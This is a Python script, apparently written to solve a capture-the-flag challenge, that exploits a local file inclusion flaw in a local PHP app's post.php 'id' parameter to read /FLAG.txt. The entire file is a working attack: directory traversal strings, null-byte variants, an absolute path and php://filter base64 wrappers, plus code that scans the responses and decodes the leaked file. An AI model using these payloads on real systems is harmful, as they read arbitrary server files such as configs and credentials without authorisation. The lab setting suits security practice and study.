import requests

base_url = "http://127.0.0.1:32891"

print("[+] Testing LFI to directly include FLAG.txt...")

# Since FLAG.txt is in root (/FLAG.txt), try various paths
flag_payloads = [
    "../../../FLAG.txt",
    "../../../../FLAG.txt",
    "../../../../../FLAG.txt",
    "../../../../../../FLAG.txt",
    "../../../../../../../FLAG.txt",
    "../../../../../../../../FLAG.txt",
    
    # Without extension appending (if .md is appended)
    "../../../FLAG",
    "../../../../FLAG",
    
    # Null byte variations (if PHP < 5.3.4)
    "../../../FLAG.txt%00",
    "../../../../FLAG.txt%00",
    
    # Try absolute path
    "/FLAG.txt",
    
    # PHP wrapper to read FLAG.txt
    "php://filter/convert.base64-encode/resource=../../../FLAG.txt",
    "php://filter/convert.base64-encode/resource=../../../../FLAG.txt",
    "php://filter/convert.base64-encode/resource=/FLAG.txt",
]

import re
import base64

for payload in flag_payloads:
    print(f"\n[+] Testing: {payload}")
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    # Check for success indicators
    if "FLAG{" in resp.text:
        print(f"[!!!] FOUND FLAG DIRECTLY!")
        print(resp.text)
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        for flag in flags:
            print(f"\n[!!!] FLAG: {flag}")
        break
    elif "Post not found" not in resp.text and "traversal" not in resp.text and len(resp.text) > 100:
        print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
        
        # Check for base64 encoded content
        b64_matches = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', resp.text)
        if b64_matches:
            for match in b64_matches[:5]:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    if 'FLAG{' in decoded:
                        print(f"[!!!] FOUND FLAG IN BASE64!")
                        print(f"Decoded: {decoded}")
                        flags = re.findall(r'FLAG\{[^}]+\}', decoded)
                        for flag in flags:
                            print(f"\n[!!!] FLAG: {flag}")
                        break
                except:
                    pass
        
        print(f"Preview (first 200 chars): {resp.text[:200]}")
    elif "traversal" in resp.text:
        print("Blocked by traversal filter")
    else:
        print("Post not found")

